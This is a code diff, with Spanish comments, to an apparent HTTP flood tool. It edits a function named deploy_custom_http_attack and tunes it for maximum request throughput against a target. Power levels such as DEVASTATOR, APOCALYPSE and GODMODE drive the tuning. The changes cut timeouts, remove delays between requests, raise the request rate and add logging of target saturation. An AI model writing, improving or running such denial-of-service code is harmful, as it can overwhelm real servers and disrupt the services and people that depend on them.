@@ -648,7 +648,13 @@ def log_message(level: str, message: str, force_console: bool = False, context: 
             "CRITICAL": Colors.RED,
             "DEBUG": Colors.MAGENTA
         }
-        print_color(log_entry.strip(), color_map.get(level, Colors.WHITE))
+        # Para errores y críticos, hacer más visible en consola
+        if level in ["ERROR", "CRITICAL"]:
+            # Formato más destacado para errores
+            error_msg = log_entry.strip()
+            print_color(f"🔴 {error_msg}", color_map.get(level, Colors.RED), True)
+        else:
+            print_color(log_entry.strip(), color_map.get(level, Colors.WHITE))
 
 # ============================================================================
 # VALIDACIÓN Y VERIFICACIÓN
@@ -2227,7 +2233,7 @@ def deploy_tool_gradually(tool_name: str, deploy_func, delay: float = 1.0, max_r
             return False
             
     except Exception as e:
-        log_message("ERROR", f"Error desplegando {tool_name}: {e}")
+        log_message("ERROR", f"❌ Error desplegando {tool_name}: {e}", force_console=True)
         return False
 
 def deploy_tools_with_throttling(tool_list: List[Tuple[str, callable]], max_tools: int, 
@@ -4224,15 +4230,15 @@ def deploy_custom_http_attack():
             session = ConnectionManager.get_session(normalized_target, worker_id)
             
             # Configurar timeout - balance entre throughput y éxito de conexión
-            # Timeouts muy cortos pueden causar muchos errores si el servidor es lento o está bajo carga
+            # Timeouts más cortos para evitar que los workers se queden bloqueados
             if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
-                request_timeout = 5  # Aumentado para evitar errores de timeout
+                request_timeout = 3  # Reducido para máximo throughput
             elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
-                request_timeout = 8  # Aumentado
+                request_timeout = 4  # Reducido
             elif POWER_LEVEL in ["MEDIUM"]:
-                request_timeout = 10
+                request_timeout = 5
             else:
-                request_timeout = 15  # Aumentado para MODERATE y niveles menores
+                request_timeout = 6  # Reducido para MODERATE - evitar bloqueos
             
             end_time = time.time() + DURATION
             request_count = 0
@@ -4266,10 +4272,10 @@ def deploy_custom_http_attack():
             while time.time() < end_time and monitoring_active:
                 request_count_worker += 1
                 try:
-                    # Si hay muchos errores consecutivos, puede ser que el target esté saturado
-                    # Esto es bueno para el stress test - continuar pero con delay mínimo
+                    # Si hay muchos errores consecutivos, alertar en consola
                     if consecutive_errors > max_consecutive_errors:
-                        time.sleep(0.1)  # Pequeña pausa si hay muchos errores
+                        log_message("WARN", f"⚠️ [WORKER {worker_id}] Muchos errores consecutivos ({consecutive_errors}) - posible saturación del target", force_console=True)
+                        time.sleep(0.01)  # Pausa mínima si hay muchos errores - no bloquear workers
                     # No loggear cada 500 requests para evitar saturación - solo errores importantes
                     if request_count_worker % 500 == 0:
                         consecutive_errors = 0
@@ -4366,21 +4372,23 @@ def deploy_custom_http_attack():
                             rate_adjustment = max(rate_adjustment * 0.9, 0.7)
                         last_rate_check = time.time()
                     
-                    # Rate limiting adaptativo - más agresivo
+                    # Rate limiting adaptativo - más agresivo para máximo throughput
                     # Para niveles altos, sin sleep para máximo throughput
                     if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
                         # Sin sleep - máximo throughput
                         pass
                     elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
                         # Sleep mínimo
-                        time.sleep(0.001)
+                        time.sleep(0.0001)  # Reducido para más throughput
                     else:
-                        # Rate adaptativo para niveles menores
-                        base_rate = MULTIPLIER * 30  # Aumentado para más requests
+                        # Rate adaptativo para niveles menores - más agresivo
+                        base_rate = MULTIPLIER * 100  # Aumentado significativamente para más requests
                         if rate_adjustment != 1.0:
-                            time.sleep(1.0 / (base_rate * rate_adjustment))
+                            sleep_time = 1.0 / (base_rate * rate_adjustment)
+                            time.sleep(max(sleep_time, 0.0001))  # Mínimo muy bajo
                         else:
-                            time.sleep(1.0 / base_rate)
+                            sleep_time = 1.0 / base_rate
+                            time.sleep(max(sleep_time, 0.0001))  # Mínimo muy bajo
                     
                 except Exception as e:
                     attack_stats["errors"].append(str(e))
@@ -4388,20 +4396,27 @@ def deploy_custom_http_attack():
                     error_msg = str(e)
                     error_type = type(e).__name__
                     
-                    # Loggear solo los primeros errores en detalle para diagnóstico (evitar saturación)
-                    if request_count < 3 or (consecutive_errors < 3 and ("Connection" in error_msg or "timeout" in error_msg.lower())):
-                        log_message("ERROR", f"❌ [WORKER {worker_id}] Error #{request_count}: {error_type}: {error_msg[:200]} | URL: {target_url[:100]}")
+                    # Loggear errores directamente en consola para diagnóstico inmediato
+                    # Mostrar siempre los primeros errores y errores de conexión importantes
+                    if request_count < 5 or (consecutive_errors < 5 and ("Connection" in error_msg or "timeout" in error_msg.lower() or "NameResolution" in error_msg)):
+                        # Forzar salida a consola para errores críticos
+                        error_summary = f"❌ [WORKER {worker_id}] Error #{request_count}: {error_type}"
+                        if "Connection" in error_msg or "timeout" in error_msg.lower():
+                            error_summary += f" | {error_msg[:150]}"
+                        if target_url:
+                            error_summary += f" | URL: {target_url[:80]}"
+                        log_message("ERROR", error_summary, force_console=True)
                     
                     # No loggear errores repetidos para evitar saturación - solo los primeros errores importantes
                     
                     consecutive_errors += 1
-                    # Pequeño delay en caso de error para no saturar
-                    time.sleep(0.01)
+                    # Continuar inmediatamente sin delay - los timeouts cortos ya manejan los errores
+                    # No agregar delays que reduzcan el throughput
                 
         except ImportError:
-            log_message("ERROR", "requests no disponible, omitiendo ataque HTTP personalizado")
+            log_message("ERROR", "❌ requests no disponible, omitiendo ataque HTTP personalizado", force_console=True)
         except Exception as e:
-            log_message("ERROR", f"Error en worker {worker_id}: {e}")
+            log_message("ERROR", f"❌ [WORKER {worker_id}] Error crítico en worker: {type(e).__name__}: {str(e)[:200]}", force_console=True)
     
     # Crear workers optimizados CON PROTECCIÓN CRÍTICA
     # Verificar memoria ANTES de crear workers para evitar reinicio del sistema
